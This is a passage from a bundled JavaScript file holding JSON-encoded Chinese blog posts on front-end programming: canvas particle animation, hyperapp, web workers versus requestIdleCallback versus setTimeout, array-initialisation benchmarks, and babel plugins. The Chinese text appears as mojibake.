class=\\"hljs-number\\">1</span>);\\n      }\\n      <span class=\\"hljs-comment\\">// æ­¤å¤„ctx_showMotionæ˜¯æ˜¾ç¤ºç”¨çš„canvasï¼Œ</span>\\n      <span class=\\"hljs-comment\\">// å¦‚æœä¸ä½¿ç”¨clearRectï¼Œé‚£ä¹ˆä¼šå‡ºç°è½¨è¿¹</span>\\n      <span class=\\"hljs-comment\\">// å¦‚æœä½¿ç”¨clearRectï¼Œé‚£ä¹ˆæ¯æ¬¡æ‰§è¡Œçš„åŠ¨ç”»ç»“æœä¸ä¼šè¢«ä¿å­˜</span>\\n      <span class=\\"hljs-comment\\">// ctx_showMotion.clearRect(0,0,canvasW,canvasH)</span>\\n      ctx_showMotion.drawImage(canvas ,<span class=\\"hljs-number\\">0</span>, <span class=\\"hljs-number\\">0</span>,)\\n\\n        raf(playing)\\n      })\\n      ctx_storeStatus.drawImage(c_showMotion,<span class=\\"hljs-number\\">0</span>,<span class=\\"hljs-number\\">0</span>)\\n    }\\n    startIfNeed()\\n  }\\n}</code></pre></code></pre>\\n<hr>\\n<p>æœ€åè€ƒè™‘ç”¨2å¼ ç”»å¸ƒæ˜¾ç¤ºï¼Œç¬¬ä¸€ä¸ªæ¸…é™¤å¹¶ä¸”æ˜¾ç¤ºå½“å‰<code>ç¦»å±canvas</code>ï¼Œç¬¬äºŒä¸ªç”¨æ¥ä¿å­˜ç¬¬ä¸€ä¸ªçš„ç»“æœ</p>\\n<pre><code><pre class=\\"hljs\\"><code>      /* çœç•¥ï¼šå‰é¢å‚æ•°å¤šäº†ä¸€ä¸ªctx_storeStatusï¼Œå…¶ä»–ä¸€è‡´ */\\n        ctx.fillStyle = `rgba(${rgba1}, ${rgba2}, ${rgba3},${rgba4}`\\n        ctx.fillRect( curX,  curY, 1, 1);\\n      }\\n      // æ­¤å¤„ctx_showMotionæ˜¯æ˜¾ç¤ºç”¨çš„canvasï¼Œ\\n      // å¦‚æœä¸ä½¿ç”¨clearRectï¼Œé‚£ä¹ˆä¼šå‡ºç°è½¨è¿¹\\n      // å¦‚æœä½¿ç”¨clearRectï¼Œé‚£ä¹ˆæ¯æ¬¡æ‰§è¡Œçš„åŠ¨ç”»ç»“æœä¸ä¼šè¢«ä¿å­˜\\n      // ctx_showMotion.clearRect(0,0,canvasW,canvasH)\\n      ctx_showMotion.drawImage(canvas ,0, 0,)\\n        raf(playing)\\n      })\\n      // ä¸“é—¨ç”¨äºä¿å­˜ctx_showMotionå¤„ç†ç»“æœçš„canvasç”»å¸ƒ\\n      ctx_storeStatus.drawImage(c_showMotion,0,0)\\n    }\\n    startIfNeed()\\n  }\\n}</code></pre></code></pre><p>æœ€ç»ˆæ•ˆæœå¦‚ä¸‹ï¼š</p>\\n<p><img src=\\"/article/img/spiral.gif\\" alt=\\"\\"></p>\\n<p>å¯ä»¥çœ‹åˆ°fpså¹³å‡åœ¨45-50ä¹‹é—´</p>\\n<hr>\\n<p>æ€»ç»“ï¼š</p>\\n<p>å……åˆ†åˆ©ç”¨canvasçš„ç”»å¸ƒï¼Œå°†å¯¹ç²’å­è¿›è¡Œ<code>fill</code>çš„åŠ¨ç”»è½¬æ¢æˆå¯¹<code>ç¦»å±canvas</code>è¿›è¡Œ<code>drawImage</code>çš„å¤„ç†</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-08-26","timeArr":[2018,7,26,0,0,0,0],"title":"canvasæ‰§è¡Œ15ä¸‡ç²’å­çš„åŠ¨ç”»","uuid":"7d5b714624c6bcfe8c2c66acd5114f3f547fbb49","summary":"<p>æœ€è¿‘é‡åˆ°çš„ï¼Œç›®çš„æ˜¯é€šè¿‡ç²’å­åŠ¨ç”»æ¸²æŸ“å›¾ç‰‡</p>\\n<p>å›¾ç‰‡å¤§å°ä¸º500*300ï¼Œå¹¶ä¸”ç²’å­åŠ¨ç”»ç»†åº¦ä¸º1ï¼Œä¹Ÿå°±æ˜¯ç²’å­æ€»é‡ä¸º15ä¸‡ï¼Œå¹¶ä¸”å½“åŠ¨ç”»å®Œæˆåï¼Œå›¾ç‰‡èƒ½å®Œæ•´æ¸…æ™°çš„æ˜¾ç¤ºå‡ºæ¥</p>\\n<p>æœ€åˆå°è¯•15ä¸‡ä¸ªç²’å­åŒæ—¶è¿åŠ¨ï¼Œç»“æœæ ‡ç­¾é¡µç›´æ¥å´©æºƒäº†ï¼Œæ„æ–™ä¹‹ä¸­...</p>\\n<pre class=\\"hljs\\"><code> <span class=\\"hljs-keyword\\">for</span> (<span class=\\"hljs-keyword\\">let</span> py = <span class=\\"hljs-number\\">0</span>; py &lt; targetH; py ++) ...</code></pre>","slug":"canvas-zhi-xing-15-wan-li-zi-de-dong-hua","sha":"742860bdc0a8dc633fd2c91feb13e60b00f46229"}')},578:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"hyperapp-kuang-jia\\">hyperappæ¡†æ¶</h2>\\n<p><a href=\\"https://github.com/stonehank/sourcecode-analysis/blob/master/source-code.hyperapp/README.md\\">å®Œæ•´æºç è¯´æ˜æ³¨é‡Š</a></p>\\n<p>ä¸€ä¸ªæå°çš„ç±»reactæ¡†æ¶ï¼Œä¹Ÿæ˜¯é€šè¿‡ Virtual DOMå¯¹èŠ‚ç‚¹è¿›è¡Œå¯¹æ¯”ï¼ˆé€šè¿‡keyï¼‰ï¼Œå†æ›´æ–°æ¸²æŸ“</p>\\n<p>æ€ç»´å¯¼å›¾ï¼š</p>\\n<p><img src=\\"/article/img/hyperapp%E5%AF%BC%E5%9B%BE.jpg\\" alt=\\"\\"></p>\\n","toc":[{"anchor":"hyperapp-kuang-jia","level":2,"text":"hyperappæ¡†æ¶"}],"relatedTags":null,"created_at":"2018-07-01","timeArr":[2018,6,1,0,0,0,0],"title":"è¶…ç®€æ´1kbæ¡†æ¶-hyperapp","uuid":"041e14e2880378f2920fae48877b46694fbfc26d","summary":"<h4>hyperappæ¡†æ¶</h4>\\n<p><a href=\\"https://github.com/stonehank/sourcecode-analysis/blob/master/source-code.hyperapp/README.md\\">å®Œæ•´æºç è¯´æ˜æ³¨é‡Š</a></p>\\n<p>ä¸€ä¸ªæå°çš„ç±»reactæ¡†æ¶ï¼Œä¹Ÿæ˜¯é€šè¿‡ Virtual DOMå¯¹èŠ‚ç‚¹è¿›è¡Œå¯¹æ¯”ï¼ˆé€šè¿‡...</p>","slug":"chao-jian-jie-1kb-kuang-jia-hyperapp","sha":"ec662a13e128b776e46f1ef9ec3fdaa63e0d7381"}')},579:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"web-worker-vs-idlerequestcallback-vs-settimeout\\">web worker VS idleRequestCallback VS setTimeout</h2>\\n<p><strong><em>æµ‹è¯•å¹³å°ï¼šFireFox</em></strong>(ChromeåµŒå¥—workerä¼šæœ‰<a href=\\"https://bugs.chromium.org/p/chromium/issues/detail?id=31666\\">bug</a>)</p>\\n<table>\\n<thead>\\n<tr>\\n<th><em>æ–¹æ³•</em></th>\\n<th align=\\"center\\">ä»0è‡ªåŠ è‡³100äº¿ï¼ˆç›¸åŒç¯å¢ƒï¼‰</th>\\n</tr>\\n</thead>\\n<tbody><tr>\\n<td>web worker(10çº¿ç¨‹)</td>\\n<td align=\\"center\\">7s</td>\\n</tr>\\n<tr>\\n<td>web worker(å•çº¿ç¨‹)</td>\\n<td align=\\"center\\">29s</td>\\n</tr>\\n<tr>\\n<td>idleRequestCallback</td>\\n<td align=\\"center\\">45s</td>\\n</tr>\\n<tr>\\n<td>setTimeout</td>\\n<td align=\\"center\\">61s</td>\\n</tr>\\n</tbody></table>\\n<p><a href=\\"https://github.com/stonehank/handleHugeTask\\">é¡¹ç›®åœ°å€</a></p>\\n<p>ä¸€äº›æ³¨æ„ç‚¹ï¼š</p>\\n<ol>\\n<li>web workeræ‰§è¡Œä¸å—ä¸»çº¿ç¨‹æ‰§è¡Œå½±å“ã€‚</li>\\n<li>idleæ‰§è¡Œæ”¶åˆ°ä¸»çº¿ç¨‹å½±å“,ä¸»çº¿ç¨‹ç¹å¿™ä¼šæš‚åœ(å› ä¸ºæ²¡æœ‰ç©ºé—²å¸§),setTimeoutä¹Ÿä¼šå—å½±å“ã€‚</li>\\n<li>workerå¯ä»¥åµŒå¥—ï¼Œå……åˆ†å‘æŒ¥å¤šæ ¸cpuçš„æ€§èƒ½ï¼ˆä¸ªäººçš„ç”µè„‘æ•°æ®ï¼Œworkerèƒ½è®©æµè§ˆå™¨è¿›ç¨‹è¿…é€Ÿåˆ°90%ï¼Œidleå’ŒsetTimeoutåœ¨35%å¾˜å¾Šï¼Œæœ€å¤š40%)ã€‚</li>\\n<li>workerä»»åŠ¡ç»“æŸå¿…é¡»æ‰‹åŠ¨å…³é—­ï¼Œå¦åˆ™çº¿ç¨‹ä¼šä¸€ç›´å ç”¨èµ„æºã€‚</li>\\n<li>idleå’ŒsetTimeoutåº”è¯¥å°†ä»»åŠ¡åˆ†å‰²æˆåˆé€‚çš„å°ä»»åŠ¡ï¼Œå¦åˆ™å•ä¸ªä»»åŠ¡è¿‡å¤§ä¼šå½±å“ä¸»çº¿ç¨‹æµç•…åº¦ã€‚</li>\\n</ol>\\n<hr>\\n<h3 id=\\"web-worker-kai-qi-fang-shi\\">web workerå¼€å¯æ–¹å¼</h3>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// å¼€å¯</span>\\n<span class=\\"hljs-keyword\\">let</span> worker=<span class=\\"hljs-keyword\\">new</span> Worker(<span class=\\"hljs-string\\">\\"workers-run.js\\"</span>)\\n<span class=\\"hljs-comment\\">// ä¼ é€’æ•°æ®ï¼Œå¯¹è±¡ä¼šåºåˆ—åŒ–ç„¶åå†ä¼ è¿‡å»</span>\\nworker.postMessage({target,<span class=\\"hljs-attr\\">threadNum</span>:threadNum.value})\\n<span class=\\"hljs-comment\\">// æ¥å—æ•°æ®</span>\\nworker.onmessage=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> (<span class=\\"hljs-params\\">e</span>) </span>{\\n    <span class=\\"hljs-keyword\\">if</span>(e.data===<span class=\\"hljs-string\\">\\"done\\"</span>){\\n        workerRunning=<span class=\\"hljs-literal\\">false</span>\\n        <span class=\\"hljs-comment\\">// ç»“æŸçº¿ç¨‹</span>\\n        worker.terminate()\\n    }\\n}</code></pre></code></pre>\\n<p>å†…éƒ¨è¿˜å¯ä»¥åµŒå¥—ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// workers-run.js</span>\\n\\n <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;n;i++) {\\n    <span class=\\"hljs-keyword\\">let</span> subWorker\\n    <span class=\\"hljs-comment\\">// çº¿ç¨‹ä¸‹å†åˆ†nä¸ªå­çº¿ç¨‹</span>\\n    subWorker = <span class=\\"hljs-keyword\\">new</span> Worker(<span class=\\"hljs-string\\">\'sub-workers-run.js\'</span>)\\n    subWorker.postMessage(target / n)\\n    subWorker.onmessage = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> (<span class=\\"hljs-params\\">e</span>) </span>{\\n        <span class=\\"hljs-comment\\">//...</span>\\n    }\\n}</code></pre></code></pre>\\n<hr>\\n<h3 id=\\"idlerequestcallback-kai-qi-fang-shi\\">idleRequestCallbackå¼€å¯æ–¹å¼</h3>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span> idleID = requestIdleCallback(<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">createIdle</span>(<span class=\\"hljs-params\\">deadline</span>) </span>{\\n    <span class=\\"hljs-comment\\">// å½“æœ‰ç©ºé—²å¸§ å¹¶ä¸” æœªå®Œæˆç›®æ ‡æ—¶</span>\\n    <span class=\\"hljs-keyword\\">while</span> (deadline.timeRemaining() &gt; <span class=\\"hljs-number\\">0</span> &amp;&amp; taskSum &lt; target) {\\n      <span class=\\"hljs-comment\\">// è°ƒç”¨æ‰§è¡Œå‡½æ•°</span>\\n      smallTask(target/<span class=\\"hljs-number\\">3000</span>);\\n    }\\n    <span class=\\"hljs-comment\\">// å¦‚æœæœªèƒ½è°ƒç”¨createIdleï¼ŒdidTimeoutä¸ºtrue</span>\\n    <span class=\\"hljs-keyword\\">if</span> (deadline.didTimeout) {\\n      <span class=\\"hljs-comment\\">// æœªèƒ½è°ƒç”¨createIdle</span>\\n    }\\n    <span class=\\"hljs-keyword\\">if</span> (taskSum &lt; target) {\\n      <span class=\\"hljs-comment\\">// é€’å½’è¯·æ±‚</span>\\n      requestIdleCallback(createIdle)\\n    } <span class=\\"hljs-keyword\\">else</span> {\\n      <span class=\\"hljs-comment\\">// å®Œæˆï¼</span>\\n    }\\n    <span class=\\"hljs-comment\\">// æœªèƒ½è°ƒç”¨createIdleçš„è¶…æ—¶æ—¶é—´</span>\\n}, {<span class=\\"hljs-attr\\">timeout</span>: <span class=\\"hljs-number\\">1000</span>})</code></pre></code></pre>\\n<hr>\\n<h3 id=\\"settimeout-de-yun-xing-fang-shi\\">setTimeoutçš„è¿è¡Œæ–¹å¼</h3>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">if</span> (taskSum&lt;target) {\\n  setTimeout( <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n    run( tg-eachTask );\\n  }, <span class=\\"hljs-number\\">0</span> );\\n}</code></pre></code></pre>\\n<p>ç»å¸¸çœ‹åˆ°ä½¿ç”¨<code>Promise.resolve().then</code>ä»£æ›¿<code>setTimeout(function(){},0)</code>çš„ï¼Œé‚£ä¹ˆè¿™é‡Œèƒ½ä¸èƒ½è¿™ä¹ˆå†™å‘¢ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-built_in\\">Promise</span>.resolve().then(<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n  run( tg-eachTask );\\n})</code></pre></code></pre>\\n<p>ç»“æœæ˜¯ä¸è¡Œçš„ï¼Œä½¿ç”¨Promiseä¼šé€ æˆä¸»çº¿ç¨‹é˜»å¡ï¼ŒåŸå› æ˜¯Promiseä¼šåŠ å…¥åˆ°<code>ä»»åŠ¡é˜Ÿåˆ—</code>ï¼Œè€ŒsetTimeoutä¼šåŠ å…¥åˆ°<code>äº‹ä»¶å¾ªç¯é˜Ÿåˆ—</code></p>\\n<p>ä¸€å¼ å›¾ç†è§£ï¼š</p>\\n<p><img src=\\"/article/img/eventloop%20and%20callbackqueue.png\\" alt=\\"\\"></p>\\n<p>å› æ­¤ï¼Œä½¿ç”¨Promiseå°±ä¸ä¼šå»ç­‰ä¸‹ä¸€æ¬¡é˜Ÿåˆ—çš„æ¸²æŸ“ï¼Œç»“æŸåæ”¾åˆ°ä»»åŠ¡é˜Ÿåˆ—æœ«å°¾ç»§ç»­è°ƒç”¨</p>\\n","toc":[{"anchor":"web-worker-vs-idlerequestcallback-vs-settimeout","level":2,"text":"web worker VS idleRequestCallback VS setTimeout"},{"anchor":"web-worker-kai-qi-fang-shi","level":3,"text":"web workerå¼€å¯æ–¹å¼"},{"anchor":"idlerequestcallback-kai-qi-fang-shi","level":3,"text":"idleRequestCallbackå¼€å¯æ–¹å¼"},{"anchor":"settimeout-de-yun-xing-fang-shi","level":3,"text":"setTimeoutçš„è¿è¡Œæ–¹å¼"}],"relatedTags":null,"created_at":"2018-07-16","timeArr":[2018,6,16,0,0,0,0],"title":"å¤„ç†é¢å¤–å¤æ‚ä»»åŠ¡çš„3ç§æ–¹å¼","uuid":"54ce9f8dc0d7064cd42d8c9ee6a7138966a00888","summary":"<h4>web worker VS idleRequestCallback VS setTimeout</h4>\\n<p><em><strong>æµ‹è¯•å¹³å°ï¼šFireFox</strong></em>(ChromeåµŒå¥—workerä¼šæœ‰<a href=\\"https://bugs.chromium.org/p/chromium/issues/detail?id=31666\\">bug</a>)</p>\\n<p>|*æ–¹æ³•...</p>","slug":"chu-li-e-wai-fu-za-ren-wu-de-3-zhong-fang-shi","sha":"f28cf454576cd104bf798125e2ecfc91945fc1cf"}')},580:function(n){n.exports=JSON.parse('{"content":"<h4 id=\\"yi-xie-chang-yong-de-chu-shi-hua-shu-zu-wei-index-de-fang-fa-de-xing-neng-bi-jiao\\">ä¸€äº›å¸¸ç”¨çš„åˆå§‹åŒ–æ•°ç»„ä¸ºindexçš„æ–¹æ³•çš„æ€§èƒ½æ¯”è¾ƒ</h4>\\n<p>æ³¨é‡Šä¸ºæ‰§è¡Œæ—¶é—´ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆå¾ªç¯æ¨èä½¿ç”¨forå¾ªç¯äº†</p>\\n<p>(æ•´æ®µå¤åˆ¶åˆ°æ§åˆ¶å°æ‰§è¡Œ)</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// ä¸€ã€</span>\\n<span class=\\"hljs-keyword\\">var</span> a=performance.now()\\n<span class=\\"hljs-keyword\\">var</span> arr=[];\\n<span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;<span class=\\"hljs-number\\">10000000</span>;i++){\\n    arr[i]=i;\\n}\\n<span class=\\"hljs-built_in\\">console</span>.log(performance.now()-a)\\n<span class=\\"hljs-comment\\">// 319ms</span>\\n\\n\\n<span class=\\"hljs-comment\\">// äºŒã€</span>\\n<span class=\\"hljs-keyword\\">var</span> a=performance.now()\\n<span class=\\"hljs-keyword\\">var</span> arr=<span class=\\"hljs-built_in\\">Array</span>(<span class=\\"hljs-number\\">10000000</span>).fill(<span class=\\"hljs-literal\\">null</span>).map(<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">_, i</span>)=&gt;</span> i )\\n<span class=\\"hljs-built_in\\">console</span>.log(performance.now()-a)\\n<span class=\\"hljs-comment\\">// 2210ms</span>\\n\\n\\n<span class=\\"hljs-comment\\">// ä¸‰ã€</span>\\n<span class=\\"hljs-keyword\\">var</span> a=performance.now()\\n<span class=\\"hljs-keyword\\">var</span> arr=[...Array(<span class=\\"hljs-number\\">10000000</span>)].map(<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">_, i</span>)=&gt;</span> i)\\n<span class=\\"hljs-built_in\\">console</span>.log(performance.now()-a)\\n<span class=\\"hljs-comment\\">// 2563ms</span>\\n\\n\\n<span class=\\"hljs-comment\\">// å››ã€</span>\\n<span class=\\"hljs-keyword\\">var</span> a=performance.now()\\n<span class=\\"hljs-keyword\\">var</span> arr=<span class=\\"hljs-built_in\\">Array</span>.from({ <span class=\\"hljs-attr\\">length</span>: <span class=\\"hljs-number\\">10000000</span> }, (_, i) =&gt; i)\\n<span class=\\"hljs-built_in\\">console</span>.log(performance.now()-a)\\n<span class=\\"hljs-comment\\">// 1843ms</span></code></pre></code></pre>\\n","toc":[{"anchor":"yi-xie-chang-yong-de-chu-shi-hua-shu-zu-wei-index-de-fang-fa-de-xing-neng-bi-jiao","level":4,"text":"ä¸€äº›å¸¸ç”¨çš„åˆå§‹åŒ–æ•°ç»„ä¸ºindexçš„æ–¹æ³•çš„æ€§èƒ½æ¯”è¾ƒ"}],"relatedTags":null,"created_at":"2018-06-19","timeArr":[2018,5,19,0,0,0,0],"title":"åˆå§‹åŒ–æ•°ç»„çš„æ€§èƒ½æ¯”è¾ƒ","uuid":"1bc31bd290d4582fbd008d35949802c4ed8ba93e","summary":"<h4>ä¸€äº›å¸¸ç”¨çš„åˆå§‹åŒ–æ•°ç»„ä¸ºindexçš„æ–¹æ³•çš„æ€§èƒ½æ¯”è¾ƒ</h4>\\n<p>æ³¨é‡Šä¸ºæ‰§è¡Œæ—¶é—´ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆå¾ªç¯æ¨èä½¿ç”¨forå¾ªç¯äº†</p>\\n<p>(æ•´æ®µå¤åˆ¶åˆ°æ§åˆ¶å°æ‰§è¡Œ)</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// ä¸€ã€</span>\\n<span class=\\"hljs-keyword\\">var</span> a=performance.now()\\n<span class=\\"hljs-keyword\\">var</span> arr=[];\\n<span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;<span class=\\"hljs-number\\">10000000</span>;i++){\\n    arr[i]=...</code></pre>","slug":"chu-shi-hua-shu-zu-de-xing-neng-bi-jiao","sha":"933a48b25bde1a4296a5e153484a755778fd792c"}')},581:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"hui-gu\\">å›é¡¾</h2>\\n<p>åœ¨è¿™ä¸€ç‰‡æ–‡ç« ä¸­ï¼Œæˆ‘æ„å»ºä¸€ä¸ªè·å–å‡½æ•°å‚æ•°åçš„å·¥å…·ï¼Œæ˜¯é€šè¿‡<code>esprima</code>å»è§£æ<code>AST</code>å¹¶å¯¹å…¶è¿›è¡Œåˆ†æåˆ¤æ–­ã€‚</p>\\n<p>é€šè¿‡å¯¹<code>AST</code>çš„åˆ†æï¼Œå‡ ä¹èƒ½å…¼å®¹æ‰€æœ‰å‡½æ•°å’Œå‚æ•°çš„å†™æ³•ï¼Œè¿™æ˜¯å› ä¸ºå®ƒæ˜¯ä»è¯­ä¹‰ä¸Šåˆ†æä»£ç ã€‚</p>\\n<h2 id=\\"wen-ti\\">é—®é¢˜</h2>\\n<p>ä½†ä½¿ç”¨çš„åŒæ—¶ï¼Œä¹Ÿå‘ç°äº†3ä¸ªé—®é¢˜ï¼Œ<strong>ç¬¬1ä¸ªæ˜¯è‡´å‘½çš„</strong>ã€‚</p>\\n<ol>\\n<li><p>babelç¼–è¯‘ã€‚</p>\\n<p> å½“æˆ‘ä»¬å¾ˆçˆ½çš„å†™ç€ES6å‡½æ•°çš„æ—¶å€™ï¼Œ<code>babel</code>ä¼šå°†ä½ çš„å‚æ•°æ ¼å¼å½»åº•æ‰“ä¹±ã€‚</p>\\n<p> ä¾‹å¦‚ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-keyword\\">let</span> sum=<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">a=<span class=\\"hljs-number\\">2</span>,b=<span class=\\"hljs-number\\">3</span></span>)=&gt;</span>{\\n   <span class=\\"hljs-built_in\\">console</span>.log(a+b)\\n }</code></pre></code></pre>\\n<p> ç¼–è¯‘åï¼Œæ²¡æœ‰å‚æ•°äº†ï¼Œå·¥å…·å½»åº•å¤±æ•ˆã€‚</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-keyword\\">var</span> sum = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">sum</span>(<span class=\\"hljs-params\\"></span>) </span>{\\n   <span class=\\"hljs-keyword\\">var</span> a = <span class=\\"hljs-built_in\\">arguments</span>.length &gt; <span class=\\"hljs-number\\">0</span> &amp;&amp; <span class=\\"hljs-built_in\\">arguments</span>[<span class=\\"hljs-number\\">0</span>] !== <span class=\\"hljs-literal\\">undefined</span> ? <span class=\\"hljs-built_in\\">arguments</span>[<span class=\\"hljs-number\\">0</span>] : <span class=\\"hljs-number\\">2</span>;\\n   <span class=\\"hljs-keyword\\">var</span> b = <span class=\\"hljs-built_in\\">arguments</span>.length &gt; <span class=\\"hljs-number\\">1</span> &amp;&amp; <span class=\\"hljs-built_in\\">arguments</span>[<span class=\\"hljs-number\\">1</span>] !== <span class=\\"hljs-literal\\">undefined</span> ? <span class=\\"hljs-built_in\\">arguments</span>[<span class=\\"hljs-number\\">1</span>] : <span class=\\"hljs-number\\">3</span>;\\n   <span class=\\"hljs-built_in\\">console</span>.log(a + b);\\n };</code></pre></code></pre>\\n</li>\\n<li><p>åŠ¨æ€ç¼–è¯‘ã€‚</p>\\n<p> å¿…é¡»è¦ç­‰åˆ°ç¨‹åºå¼€å§‹è¿è¡Œåæ‰èƒ½å·¥ä½œï¼Œè¿™æ„å‘³ç€è¦å°†æ•´ä¸ª<code>esprima</code>åº“æ”¾å…¥åˆ°é¡¹ç›®ä¸­ï¼Œé™¤éä½ çš„é¡¹ç›®ä¸­å·²ç»æœ‰ä¾èµ–\\n <code>esprima</code>ï¼Œå¦åˆ™ä¸ºè¿™ä¸ªåŠŸèƒ½ä¼šå¸¦æ¥é¢å¤–çš„ä½“ç§¯å¼€é”€ã€‚</p>\\n</li>\\n<li><p>æ€§èƒ½ã€‚</p>\\n<p> ç”±äºæ˜¯è¿è¡Œæ—¶æ‰å¼€å§‹æ‰§è¡Œåˆ†æ<code>AST</code>æ ‘ï¼Œè¿™æ„å‘³ç€ä½ çš„é¦–å±æ—¶é—´åˆåŒå’å•å¢åŠ äº†...</p>\\n</li>\\n</ol>\\n<h2 id=\\"jie-jue-fang-an\\">è§£å†³æ–¹æ¡ˆ</h2>\\n<p>å½“å‰æœ€éœ€è¦è§£å†³çš„å°±æ˜¯å¦‚æœé€‚åº”babelç¼–è¯‘ã€‚</p>\\n<p>å¾ˆæ˜¾ç„¶ï¼Œé‚£å°±æ˜¯è¦æŠ¢åœ¨babelç¼–è¯‘ä¹‹å‰ï¼Œè¿™å°±è¯·å‡ºä»Šå¤©çš„ä¸»è§’ï¼Œ<strong>babelæ’ä»¶</strong>ã€‚</p>\\n<p>é¦–å…ˆç®€è¦è¯´æ˜ä¸€ä¸‹ï¼Œbabelæ˜¯æ€ä¹ˆç¼–è¯‘ä½ çš„ä»£ç çš„ï¼Œ<code>AST</code>æ ‘ã€‚</p>\\n<p>ä¾‹å¦‚ä¸Šé¢çš„å‡½æ•°</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span> sum=<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">a=<span class=\\"hljs-number\\">2</span>,b=<span class=\\"hljs-number\\">3</span></span>)=&gt;</span>{\\n  <span class=\\"hljs-built_in\\">console</span>.log(a+b)\\n}</code></pre></code></pre>\\n<p>babelä¼šæ£€æµ‹åˆ°æ˜¯ä¸€ä¸ª<code>ArrowFunctionExpression(ç®­å¤´å‡½æ•°è¡¨è¾¾å¼)</code>ï¼Œç„¶åç»§ç»­æ£€æµ‹ï¼Œ\\nå‘ç°å‚æ•°æ˜¯<code>ExpressionStatement(è¡¨è¾¾å¼è¯­å¥)</code>ï¼Œç¬¦åˆä¿®æ”¹çš„è¦æ±‚ï¼Œäºæ˜¯æ„é€ å‡ºè¿™ä¸¤å¥çš„<code>AST</code>æ ‘</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> a = <span class=\\"hljs-built_in\\">arguments</span>.length &gt; <span class=\\"hljs-number\\">0</span> &amp;&amp; <span class=\\"hljs-built_in\\">arguments</span>[<span class=\\"hljs-number\\">0</span>] !== <span class=\\"hljs-literal\\">undefined</span> ? <span class=\\"hljs-built_in\\">arguments</span>[<span class=\\"hljs-number\\">0</span>] : <span class=\\"hljs-number\\">2</span>;\\n<span class=\\"hljs-keyword\\">var</span> b = <span class=\\"hljs-built_in\\">arguments</span>.length &gt; <span class=\\"hljs-number\\">1</span> &amp;&amp; <span class=\\"hljs-built_in\\">arguments</span>[<span class=\\"hljs-number\\">1</span>] !== <span class=\\"hljs-literal\\">undefined</span> ? <span class=\\"hljs-built_in\\">arguments</span>[<span class=\\"hljs-number\\">1</span>] : <span class=\\"hljs-number\\">3</span>;</code></pre></code></pre>\\n<p>å…¶ä¸­ä¸€æ¡<code>var a=...</code>çš„<code>AST</code>å¦‚ä¸‹ï¼Œå…·ä½“å¯ä»¥è¿™é‡Œå°è¯•ï¼Œ<a href=\\"https://astexplorer.net/\\">https://astexplorer.net/</a></p>\\n<p><img src=\\"/article/img/AST-sample.png\\" alt=\\"./img/AST-sample.png\\"></p>\\n<p>å¹¶å°†å…¶æ’å…¥åˆ°å½“å‰çš„<code>BlockStatement(å¤§æ‹¬å·ä½œç”¨åŸŸå†…)</code></p>\\n<p>æ£€æµ‹å’Œæ„é€ ï¼Œå°±æ˜¯babelï¼Œä¹Ÿæ˜¯babelæ’ä»¶çš„æ ¸å¿ƒã€‚</p>\\n<h2 id=\\"ast-jie-dian-xiu-gai\\">ASTèŠ‚ç‚¹ä¿®æ”¹</h2>\\n<p>æ­£å¼å¼€å§‹ï¼Œå…ˆä»ä¸€ä¸ªç®€å•çš„ç»“æ„çœ‹èµ·ï¼Œä¸€ä¸ªå®˜æ–¹æ’ä»¶<code>@babel/plugin-transform-object-assign</code>ï¼Œä½œç”¨æ˜¯å°†<code>Object.assign</code>\\nè½¬æ¢æˆ<code>_extends</code>ï¼Œè¿™ä¸ª<code>_extends</code>æ˜¯ä¸€ä¸ªé¢„å®šä¹‰çš„æ–¹æ³•ã€‚</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">import</span> { declare } <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\\"@babel/helper-plugin-utils\\"</span>;\\n<span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-keyword\\">default</span> declare(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">api</span> =&gt;</span> {\\n  api.assertVersion(<span class=\\"hljs-number\\">7</span>);\\n<span 